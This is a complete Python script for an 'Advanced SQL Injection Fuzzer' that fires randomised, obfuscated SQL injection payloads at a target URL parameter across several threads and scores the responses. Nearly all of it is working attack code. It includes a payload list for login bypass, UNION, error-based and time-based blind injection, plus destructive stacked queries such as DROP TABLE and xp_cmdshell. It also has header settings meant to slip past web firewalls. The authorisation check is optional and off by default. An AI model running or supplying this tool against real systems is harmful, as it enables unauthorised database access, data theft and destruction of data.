#!/usr/bin/env python3
"""
Advanced SQL Injection Fuzzer
ONLY USE ON AUTHORIZED SYSTEMS
"""

import requests
import random
import time
import sys
import json
import hashlib
from urllib.parse import urljoin, quote, unquote
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import os
from datetime import datetime

class AdvancedSQLInjectionFuzzer:
    def __init__(self, target_url, vulnerable_param="id", delay=0.5, max_workers=5):
        self.target_url = target_url
        self.vulnerable_param = vulnerable_param
        self.delay = delay
        self.max_workers = max_workers
        self.session = requests.Session()
        self.test_id = hashlib.md5(f"{target_url}{datetime.now()}".encode()).hexdigest()[:8]
        
        # Headers to bypass basic WAF
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        # SQL injection payload database
        self.sql_payloads = self.load_sql_payloads()
        
        # Advanced injection techniques
        self.injection_techniques = self.load_injection_techniques()
        
        # Success indicators with weights for scoring
        self.success_indicators = {
            "welcome": 5,
            "admin": 7,
            "password": 8,
            "database": 6,
            "mysql": 6,
            "sql": 5,
            "root": 7,
            "localhost": 5,
            "version": 6,
            "user()": 8,
            "database()": 8,
            "@@version": 7,
            "union": 6,
            "select": 5,
            "from": 4,
            "where": 4,
            "login successful": 9,
            "welcome admin": 10,
            "you are logged in": 9
        }
        
        # Error-based indicators
        self.error_indicators = {
            "sql syntax": 8,
            "mysql_fetch": 7,
            "mysql_num_rows": 6,
            "ora-": 8,
            "microsoft odbc": 7,
            "postgresql": 7,
            "sqlite": 6,
            "warning": 5,
            "unclosed": 6,
            "unterminated": 6
        }
        
        # Results storage
        self.results = {
            'test_id': self.test_id,
            'target_url': target_url,
            'start_time': datetime.now().isoformat(),
            'successful_attempts': [],
            'suspicious_attempts': [],
            'statistics': {
                'total_requests': 0,
                'successful_injections': 0,
                'suspicious_responses': 0,
                'errors': 0
            }
        }

    def load_sql_payloads(self):
        """Load comprehensive SQL injection payload database"""
        payloads = []
        
        # Basic authentication bypass
        payloads.extend([
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'#",
            "' OR 'a'='a",
            "' OR 1=1/*",
        ])
        
        # Union-based payloads
        payloads.extend([
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT null--",
            "' UNION SELECT version()--",
        ])
        
        # Error-based payloads
        payloads.extend([
            "' AND 1=CAST((SELECT version()) AS INT)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--",
            "' AND UPDATEXML(1,CONCAT(0x3a,version()),1)--",
        ])
        
        # Boolean-based blind
        payloads.extend([
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ])
        
        # Time-based blind
        payloads.extend([
            "' OR SLEEP(5)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR BENCHMARK(1000000,MD5('test'))--",
        ])
        
        # Stacked queries
        payloads.extend([
            "'; DROP TABLE users--",
            "'; SELECT * FROM users--",
            "'; EXEC xp_cmdshell('dir')--",
        ])
        
        return payloads

    def load_injection_techniques(self):
        """Load comprehensive injection techniques"""
        techniques = []
        
        # Basic encoding
        techniques.extend(["", "URL_ENCODE", "DOUBLE_ENCODE"])
        
        # Comment styles
        techniques.extend([
            "-- ", 
            "#",
            "/*",
            "-- -",
            "/*!",
            "/*!50000",
        ])
        
        # String termination
        techniques.extend([
            "'",
            "\"",
            "')",
            "\")",
            "'))",
            "\"))",
        ])
        
        # Whitespace variations
        techniques.extend([
            " ",
            "%20",
            "%09",
            "%0A",
            "%0D",
            "%0C",
            "%0B",
            "%A0",
            "/**/",
        ])
        
        # Null bytes
        techniques.extend([
            "%00",
            "\\x00",
            "\\0",
        ])
        
        return techniques

    def generate_advanced_payload(self):
        """Generate sophisticated random SQL injection payload"""
        
        # Choose base payload
        base_payload = random.choice(self.sql_payloads)
        
        # Apply random encoding
        encoding = random.choice(self.injection_techniques)
        
        if encoding == "URL_ENCODE":
            payload = quote(base_payload)
        elif encoding == "DOUBLE_ENCODE":
            payload = quote(quote(base_payload))
        else:
            payload = base_payload
        
        # Apply random comment style
        comment_style = random.choice(self.injection_techniques[1:7])  # Comment styles
        
        # Add comment if not already present
        if not any(comment in payload for comment in ['--', '#', '/*']):
            if random.random() > 0.3:
                payload += comment_style
        
        # Apply whitespace obfuscation
        if random.random() > 0.5:
            whitespace = random.choice(self.injection_techniques[7:16])  # Whitespace variations
            payload = payload.replace(' ', whitespace)
        
        # Add null byte occasionally
        if random.random() > 0.8:
            null_byte = random.choice(self.injection_techniques[16:])  # Null bytes
            payload += null_byte
        
        # Random case manipulation
        if random.random() > 0.7:
            if random.random() > 0.5:
                payload = payload.upper()
            else:
                # Random mixed case
                payload = ''.join(
                    char.upper() if random.random() > 0.5 else char.lower() 
                    for char in payload
                )
        
        return payload

    def calculate_response_score(self, response_text, response_time):
        """Calculate a confidence score for successful SQL injection"""
        score = 0
        found_indicators = []
        
        # Positive content indicators
        for indicator, weight in self.success_indicators.items():
            if indicator.lower() in response_text.lower():
                score += weight
                found_indicators.append(indicator)
        
        # Error-based indicators
        for indicator, weight in self.error_indicators.items():
            if indicator.lower() in response_text.lower():
                score += weight
                found_indicators.append(f"ERROR: {indicator}")
        
        # Response time analysis (for time-based blind SQLi)
        if response_time > 3:
            score += 10
            found_indicators.append(f"DELAY: {response_time:.2f}s")
        elif response_time > 1:
            score += 5
            found_indicators.append(f"SLOW: {response_time:.2f}s")
        
        # Length analysis
        response_length = len(response_text)
        if response_length > 50000:
            score += 8
            found_indicators.append("LARGE_RESPONSE")
        elif response_length < 100:
            score += 3
            found_indicators.append("SMALL_RESPONSE")
        
        return score, found_indicators

    def test_payload_advanced(self, payload, attempt_number):
        """Advanced payload testing with detailed analysis"""
        params = {self.vulnerable_param: payload}
        
        try:
            start_time = time.time()
            response = self.session.get(self.target_url, params=params, timeout=15)
            response_time = time.time() - start_time
            
            # Calculate confidence score
            score, indicators = self.calculate_response_score(response.text, response_time)
            
            result = {
                'attempt_number': attempt_number,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_time': response_time,
                'score': score,
                'indicators': indicators,
                'headers': dict(response.headers),
                'timestamp': datetime.now().isoformat()
            }
            
            # Classification
            if score >= 15:
                result['classification'] = 'HIGH_CONFIDENCE'
                self.results['statistics']['successful_injections'] += 1
                self.results['successful_attempts'].append(result)
            elif score >= 8:
                result['classification'] = 'MEDIUM_CONFIDENCE'
                self.results['statistics']['suspicious_responses'] += 1
                self.results['suspicious_attempts'].append(result)
            else:
                result['classification'] = 'LOW_CONFIDENCE'
            
            self.results['statistics']['total_requests'] += 1
            
            return True, result
            
        except requests.RequestException as e:
            self.results['statistics']['errors'] += 1
            error_result = {
                'attempt_number': attempt_number,
                'payload': payload,
                'error': str(e),
                'timestamp': datetime.now().isoformat(),
                'classification': 'ERROR'
            }
            return False, error_result

    def save_progress(self):
        """Save current progress to JSON file"""
        filename = f"sqli_test_{self.test_id}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        return filename

    def generate_report(self):
        """Generate comprehensive test report"""
        report = {
            'test_summary': {
                'test_id': self.test_id,
                'target': self.target_url,
                'duration': f"{(datetime.now() - datetime.fromisoformat(self.results['start_time'])).total_seconds():.2f}s",
                'total_payloads_tested': self.results['statistics']['total_requests']
            },
            'findings': {
                'high_confidence_hits': len(self.results['successful_attempts']),
                'suspicious_responses': len(self.results['suspicious_attempts']),
                'success_rate': f"{(len(self.results['successful_attempts']) / self.results['statistics']['total_requests']) * 100:.2f}%" if self.results['statistics']['total_requests'] > 0 else "0%"
            },
            'top_payloads': sorted(
                self.results['successful_attempts'] + self.results['suspicious_attempts'],
                key=lambda x: x.get('score', 0),
                reverse=True
            )[:10]
        }
        
        report_file = f"sqli_report_{self.test_id}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        return report_file

    def print_real_time_stats(self):
        """Print real-time statistics"""
        stats = self.results['statistics']
        print(f"\r[Stats] Requests: {stats['total_requests']} | "
              f"Success: {stats['successful_injections']} | "
              f"Suspicious: {stats['suspicious_responses']} | "
              f"Errors: {stats['errors']}", end='', flush=True)

    def run_advanced_continuous_test(self, iterations=200, save_interval=25):
        """Run advanced continuous testing with multiple threads"""
        print(f"[*] Advanced SQL Injection Fuzzer")
        print(f"[*] Test ID: {self.test_id}")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Parameter: {self.vulnerable_param}")
        print(f"[*] Threads: {self.max_workers}, Iterations: {iterations}")
        print(f"[*] Start Time: {self.results['start_time']}")
        print("-" * 80)
        
        def worker(attempt_num):
            payload = self.generate_advanced_payload()
            success, result = self.test_payload_advanced(payload, attempt_num)
            
            if success and result['classification'] in ['HIGH_CONFIDENCE', 'MEDIUM_CONFIDENCE']:
                print(f"\n[!] {result['classification']} - Score: {result['score']}")
                print(f"    Payload: {result['payload']}")
                print(f"    Status: {result['status_code']}, Length: {result['response_length']}")
                print(f"    Time: {result['response_time']:.2f}s")
                print(f"    Indicators: {', '.join(result['indicators'])}")
            
            return result

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_attempt = {
                executor.submit(worker, i): i for i in range(iterations)
            }
            
            for future in as_completed(future_to_attempt):
                attempt_num = future_to_attempt[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"\n[!] Exception in attempt {attempt_num}: {e}")
                
                # Save progress periodically
                if attempt_num % save_interval == 0:
                    progress_file = self.save_progress()
                    print(f"\n[*] Progress saved to: {progress_file}")
                
                self.print_real_time_stats()
                time.sleep(self.delay)
        
        # Final save and report
        self.results['end_time'] = datetime.now().isoformat()
        final_file = self.save_progress()
        report_file = self.generate_report()
        
        print(f"\n\n[*] TESTING COMPLETE")
        print(f"[*] Results saved to: {final_file}")
        print(f"[*] Report generated: {report_file}")
        
        # Print summary
        self.print_final_summary()

    def print_final_summary(self):
        """Print comprehensive final summary"""
        stats = self.results['statistics']
        successful = self.results['successful_attempts']
        suspicious = self.results['suspicious_attempts']
        
        print("\n" + "=" * 80)
        print("FINAL SUMMARY")
        print("=" * 80)
        print(f"Total Requests: {stats['total_requests']}")
        print(f"High Confidence Hits: {len(successful)}")
        print(f"Suspicious Responses: {len(suspicious)}")
        print(f"Error Count: {stats['errors']}")
        print(f"Success Rate: {(len(successful) / stats['total_requests']) * 100:.2f}%" if stats['total_requests'] > 0 else "0%")
        
        if successful:
            print("\nTOP SUCCESSFUL PAYLOADS:")
            for i, attempt in enumerate(sorted(successful, key=lambda x: x['score'], reverse=True)[:5]):
                print(f"{i+1}. Score: {attempt['score']} - {attempt['payload']}")
        
        if suspicious:
            print(f"\nSUSPICIOUS RESPONSES (needs manual verification): {len(suspicious)}")

def main():
    parser = argparse.ArgumentParser(description='Advanced SQL Injection Fuzzer')
    parser.add_argument('target_url', help='Target URL to test')
    parser.add_argument('-p', '--param', default='id', help='Vulnerable parameter name')
    parser.add_argument('-i', '--iterations', type=int, default=100, help='Number of test iterations')
    parser.add_argument('-d', '--delay', type=float, default=0.3, help='Delay between requests')
    parser.add_argument('-t', '--threads', type=int, default=3, help='Number of concurrent threads')
    parser.add_argument('--ethical-check', action='store_true', help='Perform ethical testing confirmation')
    
    args = parser.parse_args()
    
    # Ethical check
    if args.ethical_check:
        confirm = input("\n⚠️  ETHICAL WARNING: Only test systems you own or have explicit permission to test.\n"
                       "Do you have proper authorization to test this target? (yes/NO): ")
        if confirm.lower() != 'yes':
            print("[-] Testing aborted. Ethical testing requires explicit permission.")
            sys.exit(1)
    
    print("[*] Initializing Advanced SQL Injection Fuzzer...")
    
    fuzzer = AdvancedSQLInjectionFuzzer(
        target_url=args.target_url,
        vulnerable_param=args.param,
        delay=args.delay,
        max_workers=args.threads
    )
    
    try:
        fuzzer.run_advanced_continuous_test(
            iterations=args.iterations,
            save_interval=min(25, args.iterations // 4)
        )
    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
        fuzzer.save_progress()
        fuzzer.generate_report()
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        fuzzer.save_progress()

if __name__ == "__main__":
    main()
